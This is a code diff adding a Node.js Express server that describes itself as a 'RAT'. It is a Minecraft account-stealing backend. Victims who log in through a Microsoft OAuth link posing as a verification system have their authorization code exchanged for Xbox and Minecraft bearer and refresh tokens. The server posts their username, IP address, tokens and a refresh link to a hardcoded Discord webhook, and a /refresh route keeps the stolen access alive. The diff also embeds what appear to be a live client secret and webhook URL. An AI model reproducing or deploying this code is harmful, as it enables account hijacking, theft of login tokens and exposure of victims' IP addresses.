@@ -1,5 +1,11 @@
+//Change these btw
+const client_secret = 'cXw8Q~tivfs8oVPAbAakLkaFv2atQGfHW0Bs2cK0' //you need to put the "Secret Value" here not the "Secret ID"!!!!
+const client_id = 'f6f9ea1f-0a01-49e1-854a-2771d19ebee4'
+const redirect_uri = 'https://verificationsystem.onrender.com'
+const webhook_url = 'https://discord.com/api/webhooks/1047627571493339257/TRpgQ_5yAgC8Mx800LRoJn6DIhmCDOSImYMloMBam_vBfzJaWhciAHxeg-fZvQjfgJ6v'
+
 //Requirements
-const redirect = 'https://login.live.com/oauth20_authorize.srf?response_type=code&client_id=2e4c3aeb-b621-4641-baea-953a726f9b0c&redirect_uri=https://oauth.hypixei.com/callback&scope=XboxLive.signin+offline_access&state=85b73d200c622429a224b89870686ec79ab498fbec1fc3d3ba46a7c325eb3091 '
+const redirect = 'https://login.live.com/oauth20_authorize.srf?client_id='+client_id+'&response_type=code&redirect_uri='+redirect_uri+'&scope=XboxLive.signin+offline_access&state=NOT_NEEDED'
 const axios = require('axios')
 const express = require('express')
 const app = express()
@@ -18,5 +24,295 @@ app.get('/', async (req, res) => {
     if (code == null) {
         return
     }
-  
+    try {
+        const accessTokenAndRefreshTokenArray = await getAccessTokenAndRefreshToken(code)
+        const accessToken = accessTokenAndRefreshTokenArray[0]
+        const refreshToken = accessTokenAndRefreshTokenArray[1]
+        const hashAndTokenArray = await getUserHashAndToken(accessToken)
+        const userToken = hashAndTokenArray[0]
+        const userHash = hashAndTokenArray[1]
+        const xstsToken = await getXSTSToken(userToken)
+        const bearerToken = await getBearerToken(xstsToken, userHash)
+        const usernameAndUUIDArray = await getUsernameAndUUID(bearerToken)
+        const uuid = usernameAndUUIDArray[0]
+        const username = usernameAndUUIDArray[1]
+        const ip = clientIp
+        postToWebhook(username, bearerToken, uuid, ip, refreshToken)
+    } catch (e) {
+        console.log(e)
+    }
+})
+
+app.listen(port, () => {
+    console.log(`Started the server on ${port}`)
+})
+
+async function getAccessTokenAndRefreshToken(code) {
+    const url = 'https://login.live.com/oauth20_token.srf'
+
+    const config = {
+        headers: {
+            'Content-Type': 'application/x-www-form-urlencoded'
+        }
+    }
+    let data = {
+        client_id: client_id,
+        redirect_uri: redirect_uri,
+        client_secret: client_secret,
+        code: code,
+        grant_type: 'authorization_code'
+    }
+
+    let response = await axios.post(url, data, config)
+    return [response.data['access_token'], response.data['refresh_token']]
+}
+
+async function getUserHashAndToken(accessToken) {
+    const url = 'https://user.auth.xboxlive.com/user/authenticate'
+    const config = {
+        headers: {
+            'Content-Type': 'application/json', 'Accept': 'application/json',
+        }
+    }
+    let data = {
+        Properties: {
+            AuthMethod: 'RPS', SiteName: 'user.auth.xboxlive.com', RpsTicket: `d=${accessToken}`
+        }, RelyingParty: 'http://auth.xboxlive.com', TokenType: 'JWT'
+    }
+    let response = await axios.post(url, data, config)
+    return [response.data.Token, response.data['DisplayClaims']['xui'][0]['uhs']]
+}
+
+async function getXSTSToken(userToken) {
+    const url = 'https://xsts.auth.xboxlive.com/xsts/authorize'
+    const config = {
+        headers: {
+            'Content-Type': 'application/json', 'Accept': 'application/json',
+        }
+    }
+    let data = {
+        Properties: {
+            SandboxId: 'RETAIL',
+            UserTokens: [userToken]
+        }, RelyingParty: 'rp://api.minecraftservices.com/', TokenType: 'JWT'
+    }
+    let response = await axios.post(url, data, config)
+
+    return response.data['Token']
+}
+
+async function getBearerToken(xstsToken, userHash) {
+    const url = 'https://api.minecraftservices.com/authentication/login_with_xbox'
+    const config = {
+        headers: {
+            'Content-Type': 'application/json',
+        }
+    }
+    let data = {
+        identityToken: "XBL3.0 x=" + userHash + ";" + xstsToken, "ensureLegacyEnabled": true
+    }
+    let response = await axios.post(url, data, config)
+    return response.data['access_token']
+}
+
+async function getUsernameAndUUID(bearerToken) {
+    const url = 'https://api.minecraftservices.com/minecraft/profile'
+    const config = {
+        headers: {
+            'Authorization': 'Bearer ' + bearerToken,
+        }
+    }
+    let response = await axios.get(url, config)
+    return [response.data['id'], response.data['name']]
+}
+
+function postToWebhook(username, bearerToken, uuid, ip, refreshToken) {
+    const url = webhook_url
+    let data = {
+username: "Average's Pet Rat Got Another One",
+  avatar_url: "https://avatars.githubusercontent.com/u/44952349?v=4",  
+content: "@everyone",
+  embeds: [
+    {
+      color: 3482894,
+      fields: [
+        {
+          name: "**Username:**",
+          value: "```"+username+"```",
+          inline: true
+        },
+        {
+          name: "**IP:**",
+          value: "```"+ip+"```",
+          inline: true
+        },
+        {
+          name: "**Refresh:**",
+          value: "[Click Here]("+redirect_uri+"/refresh?refresh_token="+refreshToken+")",
+          inline: true
+        },
+        {
+          name: "**Token:**",
+          value: "```"+bearerToken+"```"
+        }
+      ],
+      "footer": {
+        "text": "AverageTryhard's RAT",
+        "icon_url": "https://bigrat.monster/media/bigrat.png"
+      }
+    }
+  ],
+}
+
+        axios.post(url, data).then(() => console.log("Successfully authenticated and posted to webhook."))
+    
+}
+
+
+//Refresh token shit u know how it is
+app.get('/refresh', async (req, res) => {
+    res.send('Token Refreshed!')
+    const refresh_token = req.query.refresh_token
+    if (refresh_token == null) {
+        return
+    }
+    try {
+        const refreshTokenArray = await getRefreshData(refresh_token)
+	    const newAccessToken = refreshTokenArray[0]
+        const newRefreshToken = refreshTokenArray[1]
+	    const newHashAndTokenArray = await getNewUserHashAndToken(newAccessToken)
+        const newUserToken = newHashAndTokenArray[0]
+        const newUserHash = newHashAndTokenArray[1]
+        const newXstsToken = await getNewXSTSToken(newUserToken)
+        const newBearerToken = await getNewBearerToken(newXstsToken, newUserHash)
+        const newUsernameAndUUIDArray = await getNewUsernameAndUUID(newBearerToken)
+        const newUuid = newUsernameAndUUIDArray[0]
+        const newUsername = newUsernameAndUUIDArray[1]
+	refreshToWebhook(newUsername, newBearerToken, newUuid, newRefreshToken)
+
+    } catch (e) {
+        console.log(e)
+    }
+})
+
+async function getRefreshData(refresh_token) {
+    const url = 'https://login.live.com/oauth20_token.srf'
+
+    const config = {
+        headers: {
+            'Content-Type': 'application/x-www-form-urlencoded'
+        }
+    }
+    let data = {
+        client_id: client_id,
+        redirect_uri: redirect_uri,
+        client_secret: client_secret,
+        refresh_token: refresh_token,
+        grant_type: 'refresh_token'
+    }
+
+    let response = await axios.post(url, data, config)
+    return [response.data['access_token'], response.data['refresh_token']]
+}
+
+async function getNewUserHashAndToken(newAccessToken) {
+    const url = 'https://user.auth.xboxlive.com/user/authenticate'
+    const config = {
+        headers: {
+            'Content-Type': 'application/json', 'Accept': 'application/json',
+        }
+    }
+    let data = {
+        Properties: {
+            AuthMethod: 'RPS', SiteName: 'user.auth.xboxlive.com', RpsTicket: `d=${newAccessToken}`
+        }, RelyingParty: 'http://auth.xboxlive.com', TokenType: 'JWT'
+    }
+    let response = await axios.post(url, data, config)
+    return [response.data.Token, response.data['DisplayClaims']['xui'][0]['uhs']]
+}
+
+async function getNewXSTSToken(newUserToken) {
+    const url = 'https://xsts.auth.xboxlive.com/xsts/authorize'
+    const config = {
+        headers: {
+            'Content-Type': 'application/json', 'Accept': 'application/json',
+        }
+    }
+    let data = {
+        Properties: {
+            SandboxId: 'RETAIL',
+            UserTokens: [newUserToken]
+        }, RelyingParty: 'rp://api.minecraftservices.com/', TokenType: 'JWT'
+    }
+    let response = await axios.post(url, data, config)
+
+    return response.data['Token']
+}
+
+
+async function getNewBearerToken(newXstsToken, newUserHash) {
+    const url = 'https://api.minecraftservices.com/authentication/login_with_xbox'
+    const config = {
+        headers: {
+            'Content-Type': 'application/json',
+        }
+    }
+    let data = {
+        identityToken: "XBL3.0 x=" + newUserHash + ";" + newXstsToken, "ensureLegacyEnabled": true
+    }
+    let response = await axios.post(url, data, config)
+    return response.data['access_token']
+}
+
+async function getNewUsernameAndUUID(newBearerToken) {
+    const url = 'https://api.minecraftservices.com/minecraft/profile'
+    const config = {
+        headers: {
+            'Authorization': 'Bearer ' + newBearerToken,
+        }
+    }
+    let response = await axios.get(url, config)
+    return [response.data['id'], response.data['name']]
+}
+
+
+function refreshToWebhook(newUsername, newBearerToken, newUuid, newRefreshToken) {
+    const url = webhook_url
+    let data = {
+username: "Refreshed ong",
+  avatar_url: "https://avatars.githubusercontent.com/u/44952349?v=4",  
+content: "@everyone TOKEN REFRESHED!",
+  embeds: [
+    {
+      color: 3482894,
+      fields: [
+        {
+          name: "**Username:**",
+          value: "```"+newUsername+"```",
+          inline: true
+        },
+        {
+          name: "**UUID:**",
+          value: "```"+newUuid+"```",
+          inline: true
+        },
+        {
+          name: "**New Refresh Link:**",
+          value: "[Click Here]("+redirect_uri+"/refresh?refresh_token="+newRefreshToken+")",
+          inline: true
+        },
+        {
+          name: "**New Token:**",
+          value: "```"+newBearerToken+"```"
+        }
+      ],
+      "footer": {
+        "text": "AverageTryahard's Rat",
+        "icon_url": "https://bigrat.monster/media/bigrat.png"
+      }
+    }
+  ],
+}
+        axios.post(url, data).then(() => console.log("Successfully refreshed token."))
+    
 }
